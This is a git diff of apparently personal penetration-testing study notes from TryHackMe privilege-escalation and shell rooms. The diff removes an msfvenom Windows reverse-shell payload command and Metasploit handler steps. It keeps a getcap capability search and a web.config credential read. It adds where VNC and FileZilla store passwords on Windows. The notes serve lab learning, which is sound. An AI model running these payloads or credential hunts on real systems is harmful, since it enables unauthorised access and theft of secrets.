@@ -9,25 +9,9 @@
 ## Prev esc
 
 https://tryhackme.com/room/linprivesc
+=> If there are tools not installed on your target: https://github.com/andrew-d/static-binaries
 => hint/notes
 => network
-
-https://tryhackme.com/room/introtoshells
-
-* If there are tools not installed on your target: https://github.com/andrew-d/static-binaries
-* `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`
-* staged reverse shell payloads and stageless
-* exploit/multi/handler
-  * It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads
-  * `set PAYLOAD X`
-  * `exploit -j`
-* socat is a sort of ncat+more, but not installed by default, and harder to learn.
-  * Read again the section: https://tryhackme.com/room/introtoshells
-  * Can encrypt, may bypass an IDS: https://tryhackme.com/room/introtoshells
-* Socat: transfer the socat binary
-* Reverse shells/... note lasty
-
-https://tryhackme.com/room/linprivesc
 => capabilities
 => `getcap -r / 2>/dev/null`
 => gtfobins
@@ -102,6 +86,10 @@ type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr
   * https://decoder.cloud/
   * https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf
   * https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
+
+On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at C:\Program Files\FileZilla Server\FileZilla Server.xml
+or C:\xampp\FileZilla Server\FileZilla Server.xml
+. These can be MD5 hashes or in plaintext, depending on the version.
 
 <hr>
 
